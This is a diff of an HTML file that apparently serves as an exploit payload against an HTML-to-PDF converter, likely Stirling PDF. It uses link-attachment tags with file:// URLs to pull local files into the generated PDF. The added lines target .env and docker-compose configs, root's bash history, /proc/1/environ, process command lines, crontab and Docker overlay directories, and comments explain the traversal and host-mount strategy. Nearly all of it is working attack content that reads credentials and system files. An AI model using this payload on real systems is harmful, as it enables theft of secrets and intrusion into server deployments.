@@ -6,11 +6,35 @@
     <title>Document</title>
 </head>
 <body>
-<link rel="attachment" href="file:///proc/self/status">
-<link rel="attachment" href="file:///proc/self/mounts">
+<!-- Mounted configs directory (HOST FILESYSTEM ACCESS!) -->
+<link rel="attachment" href="file:///configs/">
+<link rel="attachment" href="file:///configs/docker-compose.yml">
+<link rel="attachment" href="file:///configs/.env">
+<link rel="attachment" href="file:///configs/settings.yml">
 
-<!-- More likely to be accessible -->
-<link rel="attachment" href="file:///home/stirlingpdfuser/.bash_history">
+<!-- Since /etc files are bind-mounted from host, try to traverse -->
+<link rel="attachment" href="file:///etc/../home/">
+<link rel="attachment" href="file:///etc/../root/.bash_history">
+
+<!-- Docker overlay filesystem (might contain other containers' data) -->
+<link rel="attachment" href="file:///var/lib/docker/overlay2/22954df52c160bc411c2d2939d57b92e49891985246b762289c9b6b86e52382a/diff/">
+
+<!-- World-readable system files -->
+<link rel="attachment" href="file:///etc/crontab">
+<link rel="attachment" href="file:///etc/os-release">
+<link rel="attachment" href="file:///proc/1/environ">
+<link rel="attachment" href="file:///proc/1/cmdline">
+
+<!-- Check for other running processes -->
+<link rel="attachment" href="file:///proc/1/status">
+<link rel="attachment" href="file:///proc/9/environ">
+<link rel="attachment" href="file:///proc/9/cmdline">
+
+<!-- Tessdata directory (mounted from host) -->
+<link rel="attachment" href="file:///usr/share/tessdata/">
+
+<!-- Temporary files (accessible with UID 1000) -->
 <link rel="attachment" href="file:///tmp/">
+<link rel="attachment" href="file:///home/stirlingpdfuser/">
 </body>
 </html>
